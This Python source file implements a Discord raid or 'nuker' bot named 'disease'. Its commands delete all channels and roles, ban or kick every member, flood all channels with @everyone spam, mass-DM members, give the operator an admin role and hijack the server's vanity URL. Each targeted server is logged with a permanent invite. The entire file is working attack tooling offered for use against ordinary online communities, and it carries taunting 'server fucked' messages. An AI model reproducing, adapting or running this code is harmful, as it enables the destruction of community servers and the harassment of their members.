##############################################################################
#                                                                            #
#                  This code was entirely written                            #
#                  by xfsc, the dear skids won't                             #
#                  understand how it works, that's                           #
#                  why it has comments.                                      #
#                  Made with love by xfsc.                                   #
#                                                                            #
##############################################################################

import nextcord
from nextcord.ext import commands
import asyncio
import random
import aiohttp
import requests
import fade
import datetime

TOKEN = "YOUR_BOT_TOKEN"
PREFIX = "$" # You can change this prefix if you want

bot_name = "xfsc"
icon_url = "https://i.ibb.co/8gvymbLZ/DISEASE.png"

intents = nextcord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, help_command=None, intents=intents)
guilds_selected = {}

# SAFE GUILDS (You should put your main server here or the one you dont want it to be raided with the bot)
SAFE_GUILDS = [1430726106260176928, 1400244538324287610] 

# MAIN GUILD (The main guild {user must be here to use the bot})
MAIN_GUILD_ID = 1430726106260176928

# INVITE CHANNEL (Channel where the users have to put $invite)
INVITE_CHANNEL_ID = 1432043596818677821

# LOG INFO GUILD (See what servers the bot connects in)
LOG_GUILD_ID = 1432855045346430999

# Embed variables
EMOJIS = {
    "info": "<:info:1400245346805747863>",
    "success": "<a:success:1400246359248076800>",
    "error": "<a:error:1400246351236698313>",
    "dot": "<a:dot:1400246347311087656>",
    "spark": "<a:spark:1400246366193586259>",
    "uzi": "<a:uzi:1400246375735623821>",
}
FOOTER_TEXT = "disease - xfsc"

# Utils

async def styled_embed(desc, title=None, color=nextcord.Color.from_rgb(10, 10, 10), image=None, with_thumb=False):
    embed = nextcord.Embed(description=desc, color=color)
    if title:
        embed.title = title
    if image:
        embed.set_image(url=image)
    if with_thumb:
        embed.set_thumbnail(url="https://i.ibb.co/B59D4cHM/disease1.gif")
    embed.set_footer(text=FOOTER_TEXT)
    return embed

async def send_log_embed(guild, author, command=None):
    await asyncio.sleep(1)

    log_guild = bot.get_guild(LOG_GUILD_ID)
    if not log_guild:
        print("[LOGS] ❌ No se encontró el servidor de logs o el bot no está dentro.")
        return

    # Here goes the LOG CHANNEL ID (FROM THE LOG INFO GUILD)
    LOG_CHANNEL_ID = 1432855123888963687  

    # You could use the above one or delete that one and use this one if you want it to work with name


    # log_channel = next((c for c in log_guild.text_channels if c.name == "logs"), None)

    log_channel = log_guild.get_channel(LOG_CHANNEL_ID)
    if not log_channel:
        print("[LOGS] ⚠️ No se encontró el canal de logs especificado.")
        return

    # Logs when someone use the $join command on an ID

    if not command:
        try:
            invite_link = "No disponible"
            try:
                invites = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
                invite_link = invites.url
            except Exception:
                pass

            desc = (
                f"{EMOJIS['spark']} **Nuevo servidor conectado con `$join`:**\n\n"
                f"{EMOJIS['info']} **Nombre:** `{guild.name}`\n"
                f"{EMOJIS['dot']} **ID:** `{guild.id}`\n"
                f"{EMOJIS['dot']} **Miembros:** `{guild.member_count}`\n"
                f"{EMOJIS['dot']} **Boosts:** `{guild.premium_subscription_count}`\n"
                f"{EMOJIS['info']} **Invitación:** {invite_link}\n"
                f"{EMOJIS['success']} **Seleccionado por:** {author.mention}"
            )

            embed = await styled_embed(desc, title="🧾 Nuevo servidor logueado", with_thumb=True)
            await log_channel.send(embed=embed)
            print(f"[LOGS] ✅ Log enviado: nuevo servidor {guild.name}")
        except Exception as e:
            print(f"[ERROR LOG JOIN] {e}")

    else:
        # Logs command
        try:
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            desc = (
                f"{EMOJIS['spark']} **Comando ejecutado:** `{command}`\n"
                f"{EMOJIS['info']} **Usuario:** {author.mention}\n"
                f"{EMOJIS['dot']} **Hora:** `{now}`"
            )

            embed = await styled_embed(desc, title="⚙️ Acción registrada")
            await log_channel.send(embed=embed)
            print(f"[LOGS] ⚙️ Comando `{command}` registrado en {log_channel.name}.")
        except Exception as e:
            print(f"[ERROR LOG COMMAND] {e}")

@bot.check
async def global_check(ctx):
    return await user_authorized(ctx)

async def user_authorized(ctx):
    # This verifies if the user is in the main server. If not it returns False
    main_guild = bot.get_guild(MAIN_GUILD_ID)
    if main_guild and main_guild.get_member(ctx.author.id):
        return True
    embed = await styled_embed(f"{EMOJIS['error']} No podés usar este bot si no estás en el servidor principal.")
    try:
        await ctx.send(embed=embed)
    except:
        pass
    return False

async def realizar_spam(ctx, guild=None):
    try:
        target_guild = guild or bot.get_guild(guilds_selected.get(ctx.author.id))
        if not target_guild:
            embed = await styled_embed(f"{EMOJIS['error']} No se ha podido determinar el servidor.", title="Error")
            return await ctx.author.send(embed=embed)

        opciones_links = [
            "@everyone https://discord.gg/4KCtJjnUdb",
            "@everyone https://www.youtube.com/@xxfscc"
        ]
        embed = nextcord.Embed(
            description=f"‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎‎**SERVER FUCKED BY DISEASE**\n‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎**#disease**\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎<a:success:1400246359248076800>\n\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎<a:spark:1400246366193586259> **`DiseaseCult`** <a:spark:1400246366193586259>\n\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎[**OFFICIAL CHANNEL**](https://www.youtube.com/@xxfscc)\n‎\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎**made by xfsc**",
            color=nextcord.Color.from_rgb(0, 0, 0)
        )
        embed.set_image(url="https://i.ibb.co/B59D4cHM/disease1.gif")
        embed.set_footer(text=" ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎made by xfsc. | $pwned by disease")

        canales = [c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages]

        tasks = [
            c.send(content=random.choice(opciones_links), embed=embed)
            for c in canales
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

        async def spamear(channel, opciones_links, embed):
            for _ in range(1000):
                try:
                    await channel.send(content=random.choice(opciones_links), embed=embed)
                except Exception:
                    pass
                await asyncio.sleep(0.1)

        tasks = [spamear(c, opciones_links, embed) for c in canales]
        await asyncio.gather(*tasks)

        await ctx.send(embed=await styled_embed(
            f"{EMOJIS['success']} Spam lanzado en `{len(canales)}` canales **simultáneamente**."
        ))
    except Exception as e:
        print(f"[ERROR] en spam: {e}")
        embed = await styled_embed(f"{EMOJIS['error']} No se pudo ejecutar `$spam`.", title="Error")
        await ctx.author.send(embed=embed)

async def delete_all_channels(guild):
    await asyncio.gather(*[channel.delete() for channel in guild.channels], return_exceptions=True)

async def create_channels(guild, amount):
    await asyncio.gather(*[guild.create_text_channel("f̶̷̶u̶̷̶c̶̷̶k̶̷̶e̶̷̶d̶̷̶ ̶̷̶b̶̷̶y̶̷̶ ̶̷̶d̶̷̶i̶̷̶s̶̷̶e̶̷̶a̶̷̶s̶̷̶e̶̷̶") for _ in range(amount)], return_exceptions=True)

async def ban_all_members_fast(guild, autor_id=None):
    async def ban_member(member):
        try:
            await member.ban(reason=bot_name)
        except Exception as e:
            print(f"[ERROR] No se pudo banear a {member}: {e}")
    miembros = [m for m in guild.members if not m.bot and m.id != autor_id]
    await asyncio.gather(*(ban_member(m) for m in miembros))

async def kick_all_members(guild):
    await asyncio.gather(*[m.kick(reason=bot_name) for m in guild.members if not m.bot])

async def rename_all(guild, nuevo_nombre):
    await asyncio.gather(*[m.edit(nick=nuevo_nombre) for m in guild.members if m != guild.me])

async def delete_all_roles(guild):
    await asyncio.gather(*[r.delete() for r in guild.roles if r != guild.default_role])

async def create_roles(guild, cantidad):
    await asyncio.gather(*[guild.create_role(name=f"{bot_name}-{i}") for i in range(cantidad)])

async def steal_vanity(guild, code):
    url = f"https://discord.com/api/v9/guilds/{guild.id}/vanity-url"
    headers = {"Authorization": f"Bot {TOKEN}"}
    json_data = {"code": code}
    await asyncio.to_thread(requests.patch, url, headers=headers, json=json_data)

async def cambiar_nombre_y_icono(guild):
    async with aiohttp.ClientSession() as session:
        async with session.get(icon_url) as r:
            if r.status == 200:
                icon = await r.read()
                await guild.edit(name="#disease", icon=icon)

async def lock_unlock_channels(guild, lock=True):
    overwrite = nextcord.PermissionOverwrite()
    overwrite.send_messages = not lock
    tasks = []
    for channel in guild.text_channels:
        tasks.append(channel.set_permissions(guild.default_role, overwrite=overwrite))
    await asyncio.gather(*tasks)

async def mass_dm(guild, mensaje_embed):
    for member in guild.members:
        if not member.bot:
            try:
                await member.send(embed=mensaje_embed)
            except:
                continue

async def leave_guild(guild):
    await guild.leave()

async def nuke_server(ctx, guild):
    await cambiar_nombre_y_icono(guild)
    await delete_all_channels(guild)
    await create_channels(guild, 50)
    await realizar_spam(ctx, guild)
    await delete_all_roles(guild)
    await create_roles(guild, 20)
    await rename_all(guild, "disease")

# Handlers
async def ejecutar(ctx, funcion, mensaje, necesita_ctx=False):
    guild_id = guilds_selected.get(ctx.author.id)
    if not guild_id:
        return await ctx.send(embed=await styled_embed(f"{EMOJIS['error']} Usa `{PREFIX}join <id>` primero."))

    guild = bot.get_guild(guild_id)
    if not guild:
        return await ctx.send(embed=await styled_embed(f"{EMOJIS['error']} No encontré el servidor."))

    if guild.id in SAFE_GUILDS:
        return await ctx.send(embed=await styled_embed(f"{EMOJIS['error']} Este servidor está protegido."))

    if necesita_ctx:
        await funcion(ctx, guild)
    else:
        await funcion(guild)

    await ctx.send(embed=await styled_embed(f"{EMOJIS['success']} {mensaje}"))
    await send_log_embed(guild, ctx.author, command=ctx.command.name)
    
# Commands
def solo_dm():
    async def predicate(ctx):
        return isinstance(ctx.channel, nextcord.DMChannel)
    return commands.check(predicate)

@bot.command()
@solo_dm()
async def admin(ctx):
    async def dar_admin(guild):
        try:
            member = guild.get_member(ctx.author.id)
            if not member:
                print("[ERROR] No se encontró el miembro en el servidor.")
                return
            role = await guild.create_role(name="disease$", permissions=nextcord.Permissions.all())
            await member.add_roles(role)
        except Exception as e:
            print(f"[ERROR] al dar admin: {e}")
    await ejecutar(ctx, dar_admin, "admin asignado")

@bot.command()
@solo_dm()
async def join(ctx, guild_id: int):
    if not await user_authorized(ctx):
        return
    if guild_id in SAFE_GUILDS:
        return await ctx.send(embed=await styled_embed(f"{EMOJIS['error']} No podés seleccionar este servidor porque está protegido."))

    guild = bot.get_guild(guild_id)
    if guild:
        guilds_selected[ctx.author.id] = guild_id
        icon = guild.icon.url if guild.icon else None
        desc = (f"{EMOJIS['success']} Guild `{guild.name}` seleccionada correctamente.\n"
                f"{EMOJIS['info']} Miembros: `{guild.member_count}`\n"
                f"{EMOJIS['spark']} Boosts: `{guild.premium_subscription_count}`")
        embed = await styled_embed(desc, title=f"Conectado a {guild.name}")
        if icon:
            embed.set_thumbnail(url=icon)
        await ctx.send(embed=embed)
    else:
        await ctx.send(embed=await styled_embed(f"{EMOJIS['error']} Guild no encontrada."))

@bot.command()
@solo_dm()
async def status(ctx):
    guild_id = guilds_selected.get(ctx.author.id)
    if guild_id:
        guild = bot.get_guild(guild_id)
        if guild:
            await ctx.send(embed=await styled_embed(f"{EMOJIS['info']} Servidor seleccionado: **{guild.name}** (`{guild.id}`)"))
            return
    await ctx.send(embed=await styled_embed(f"{EMOJIS['error']} No hay servidor seleccionado."))

@bot.command()
@solo_dm()
async def spam(ctx):
    await realizar_spam(ctx)

@bot.command()
@solo_dm()
async def delc(ctx): await ejecutar(ctx, delete_all_channels, "canales eliminados")

@bot.command()
@solo_dm()
async def crc(ctx, cantidad: int): await ejecutar(ctx, lambda g: create_channels(g, cantidad), f"{cantidad} canales creados")

@bot.command()
@solo_dm()
async def banall(ctx): await ejecutar(ctx, lambda g: ban_all_members_fast(g, autor_id=ctx.author.id), "todos baneados")

@bot.command()
@solo_dm()
async def kickall(ctx): await ejecutar(ctx, kick_all_members, "todos kickeados")

@bot.command()
@solo_dm()
async def renameall(ctx, nuevo): await ejecutar(ctx, lambda g: rename_all(g, nuevo), "todos renombrados")

@bot.command()
@solo_dm()
async def eliminarroles(ctx): await ejecutar(ctx, delete_all_roles, "roles eliminados")

@bot.command()
@solo_dm()
async def crearroles(ctx, cantidad: int): await ejecutar(ctx, lambda g: create_roles(g, cantidad), f"{cantidad} roles creados")

@bot.command()
@solo_dm()
async def steal(ctx, code): await ejecutar(ctx, lambda g: steal_vanity(g, code), "vanity cambiada")

@bot.command()
@solo_dm()
async def nuke(ctx):
    await ejecutar(ctx, nuke_server, "servidor nukeado", necesita_ctx=True)

@bot.command()
@solo_dm()
async def bypasscmd(ctx):
    async def bypass(guild):
        await cambiar_nombre_y_icono(guild)
        tasks = []
        for channel in guild.channels:
            if isinstance(channel, (nextcord.TextChannel, nextcord.VoiceChannel, nextcord.CategoryChannel)):
                try:
                    tasks.append(channel.edit(name="bypass-disease-is-here"))
                except Exception as e:
                    print(f"[ERROR] Renombrando canal/categoría: {e}")
        await asyncio.gather(*tasks, return_exceptions=True)
        await realizar_spam(ctx, guild)
    await ejecutar(ctx, bypass, "bypass ejecutado")

@bot.command()
@solo_dm()
async def lockall(ctx): await ejecutar(ctx, lambda g: lock_unlock_channels(g, True), "canales bloqueados")

@bot.command()
@solo_dm()
async def unlockall(ctx): await ejecutar(ctx, lambda g: lock_unlock_channels(g, False), "canales desbloqueados")

@bot.command()
@solo_dm()
async def massdm(ctx, *, mensaje: str):
    embed = await styled_embed(mensaje, title=f"{EMOJIS['spark']} #disease")
    await ejecutar(ctx, lambda g: mass_dm(g, embed), "mensajes enviados por DM")

@bot.command()
@solo_dm()
async def leave(ctx): await ejecutar(ctx, leave_guild, "servidor abandonado")

@bot.command(name="help")
@solo_dm()
async def help_command(ctx):
    desc = "\n".join([
        f"{EMOJIS['dot']} `{PREFIX}join <id>` - seleccionar servidor",
        f"{EMOJIS['dot']} `{PREFIX}status` - muestra el servidor actual",
        f"{EMOJIS['dot']} `{PREFIX}nuke` - destruir todo",
        f"{EMOJIS['dot']} `{PREFIX}spam` - spam masivo en todos los canales",
        f"{EMOJIS['dot']} `{PREFIX}delc` - eliminar canales",
        f"{EMOJIS['dot']} `{PREFIX}crc <num>` crear canales",
        f"{EMOJIS['dot']} `{PREFIX}banall` - banea a todos los miembros",
        f"{EMOJIS['dot']} `{PREFIX}kickall` - expulsa a todos los miembros",
        f"{EMOJIS['dot']} `{PREFIX}renameall <nombre>` - renombra a todos los miembros",
        f"{EMOJIS['dot']} `{PREFIX}eliminarroles` - borra todos los roles",
        f"{EMOJIS['dot']} `{PREFIX}crearroles <num>` - crear roles",
        f"{EMOJIS['dot']} `{PREFIX}steal <vanity>` - roba la vanity si es posible",
        f"{EMOJIS['dot']} `{PREFIX}admin` - darte admin",
        f"{EMOJIS['dot']} `{PREFIX}bypasscmd` - spam sin borrar",
        f"{EMOJIS['dot']} `{PREFIX}lockall` - bloquea todos los canales",
        f"{EMOJIS['dot']} `{PREFIX}unlockall` - desbloquea todos los canales",
        f"{EMOJIS['dot']} `{PREFIX}massdm <msg>` - DM a todos los miembros",
        f"{EMOJIS['dot']} `{PREFIX}leave` - salir del servidor"
    ])
    embed = await styled_embed(desc, title=f"{EMOJIS['info']} lista de comandos", with_thumb=True)
    await ctx.send(embed=embed)

# Events
@bot.event
async def on_ready():
    text = '''

                               ___                         
                          ____/ (_)_______  ____ _________ 
                         / __  / / ___/ _ \/ __ `/ ___/ _ \
                        / /_/ / (__  )  __/ /_/ (__  )  __/
                        \__,_/_/____/\___/\__,_/____/\___/ 
                                   
                            enteramente hecho por xfsc.
    '''
    faded_text = fade.blackwhite(text)
    print(faded_text)
    print(f"{bot.user} is on.")
    url = f"Invite me in: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot"
    print(fade.purplepink(url))

@bot.command()
async def invite(ctx):
    if ctx.channel.id != INVITE_CHANNEL_ID:
        embed = await styled_embed(f"{EMOJIS['error']} Solo podés usar este comando en el canal autorizado.")
        return await ctx.send(embed=embed)

    url = f"https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot"
    embed = nextcord.Embed(
        title=f"{EMOJIS['spark']} Invitación del bot",
        description=f"[`{ctx.author.name}`]({url})",
        color=nextcord.Color.from_rgb(0, 0, 0)
    )
    embed.set_footer(text="Usá este link para invitarme a tus servidores.")
    try:
        await ctx.author.send(embed=embed)
        await ctx.send(embed=await styled_embed(f"{EMOJIS['success']} {ctx.author.mention}, revisá tus MD, te mandé la invitación."))
    except:
        await ctx.send(embed=await styled_embed(f"{EMOJIS['error']} No pude mandarte MD, habilitalos para recibir el link."))

@bot.event
async def on_guild_join(guild):
    if guild.id in SAFE_GUILDS:
        try:
            await guild.leave()
            print(f"[SAFE] Abandoné {guild.name} porque está protegido.")
            return
        except:
            pass

    log_guild = bot.get_guild(LOG_GUILD_ID)
    if not log_guild:
        print("[LOGS] ❌ No se encontró el servidor de logs o el bot no está dentro.")
        return

    LOG_CHANNEL_ID = 1432855123888963687
    log_channel = log_guild.get_channel(LOG_CHANNEL_ID)
    if not log_channel:
        print("[LOGS] ⚠️ No se encontró el canal de logs especificado.")
        return

    inviter_user = None
    try:
        invites_before = await guild.invites()
        await asyncio.sleep(2)
        invites_after = await guild.invites()

        for before, after in zip(invites_before, invites_after):
            if after.uses > before.uses:
                inviter_user = after.inviter
                break
    except Exception as e:
        print(f"[LOGS] No se pudo obtener el usuario que invitó: {e}")

    owner = guild.owner or "Desconocido"
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    invite_link = "No disponible"
    try:
        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
        invite_link = invite.url
    except Exception:
        pass

    desc = (
        f"{EMOJIS['spark']} **Nuevo servidor detectado:**\n\n"
        f"{EMOJIS['info']} **Nombre:** `{guild.name}`\n"
        f"{EMOJIS['dot']} **ID:** `{guild.id}`\n"
        f"{EMOJIS['dot']} **Miembros:** `{guild.member_count}`\n"
        f"{EMOJIS['dot']} **Boosts:** `{guild.premium_subscription_count}`\n"
        f"{EMOJIS['dot']} **Dueño:** `{owner}`\n"
        f"{EMOJIS['info']} **Invitación:** {invite_link}\n"
        f"{EMOJIS['dot']} **Fecha:** `{now}`"
    )

    if inviter_user:
        desc += f"\n{EMOJIS['success']} **Invitado por:** `{inviter_user}`"

    embed = await styled_embed(desc, title="🧾 Nuevo servidor conectado", with_thumb=True)
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)

    try:
        await log_channel.send(embed=embed)
        print(f"[LOGS] ✅ Log enviado correctamente por unirse a {guild.name}")
    except Exception as e:
        print(f"[ERROR LOG JOIN] {e}")

    try:
        if inviter_user:
            embed_dm = await styled_embed(
                f"Gracias por invitarme a **{guild.name}**!\nUsá `{PREFIX}join {guild.id}` por MD y después `{PREFIX}help`.",
                title=f"{EMOJIS['spark']} disease connected ⚙️"
            )
            await inviter_user.send(embed=embed_dm)
            print(f"[LOGS] Mensaje enviado al usuario que invitó: {inviter_user}")
        else:
            print("[LOGS] No se pudo detectar quién invitó al bot.")
    except Exception as e:
        print(f"[DM ERROR] No se pudo enviar mensaje al usuario: {e}")

    if guild.id != MAIN_GUILD_ID:
        async def delayed_leave():
            await asyncio.sleep(300)
            try:
                await guild.leave()
                print(f"[AUTO-LEAVE] Abandoné {guild.name} después de 5 minutos.")
            except:
                pass
        bot.loop.create_task(delayed_leave())
    try:
        embed = await styled_embed(
            f"Gracias por invitarme a **{guild.name}**!\nUsá `{PREFIX}join {guild.id}` por MD y después `{PREFIX}help`.",
            title=f"{EMOJIS['spark']} @disease"
        )
        await guild.owner.send(embed=embed)
    except:
        pass

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embed = await styled_embed(f"{EMOJIS['error']} Comando inexistente. Usa `{PREFIX}help`.", title="Error")
        await ctx.send(embed=embed)
    elif isinstance(error, commands.MissingRequiredArgument):
        embed = await styled_embed(f"{EMOJIS['error']} Argumentos faltantes. Usa `{PREFIX}help`.", title="Error")
        await ctx.send(embed=embed)

bot.run(TOKEN)